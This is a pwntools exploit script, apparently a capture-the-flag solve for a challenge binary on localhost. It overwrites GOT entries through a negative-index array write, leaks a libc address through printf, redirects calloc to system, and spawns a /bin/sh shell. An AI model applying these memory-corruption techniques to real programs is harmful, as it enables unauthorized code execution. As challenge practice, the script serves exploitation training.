from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('localhost', 7777)
else:
    p = process(filepath)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

def f(n, i, v):
    sendlineafter(p, b'n = ', str(n).encode())
    sendlineafter(p, b'i = ', str(i).encode())
    sendlineafter(p, b'] = ', str(v).encode())

ret = 0x4008c4
printf = 0x4007d4
offset = libc.symbols['_IO_2_1_stdin_'] - libc.symbols['system']
binsh = e.bss() + 0x100


f(-1, e.got['puts']//4, e.symbols['main'])
f(-1, e.got['setbuf']//4, printf)
f(-1, (e.got['setbuf']+4)//4, 0)
f(-1, e.got['exit']//4, e.symbols['setup']+1)

# exit -> setup -> setbuf -> printf
sendlineafter(p, b'n = ', b'300')
p.recvuntil(b'arr[')
addr = int(p.recvuntil(b']')[:-1])
if addr < 0:
    addr = ~(addr^0xffffffff)
print(hex(addr))
addr -= offset
sendlineafter(p, b' = ', b'+')

# calloc -> system
arg = u64(b'/bin/sh\0')
f(-1, binsh//4, arg&0xffffffff)
f(-1, (binsh+4)//4, arg>>32)
f(-1, e.got['exit']//4, ret)
f(-1, e.got['calloc']//4, addr)

sendlineafter(p, b'n = ', str(binsh).encode())
p.interactive()
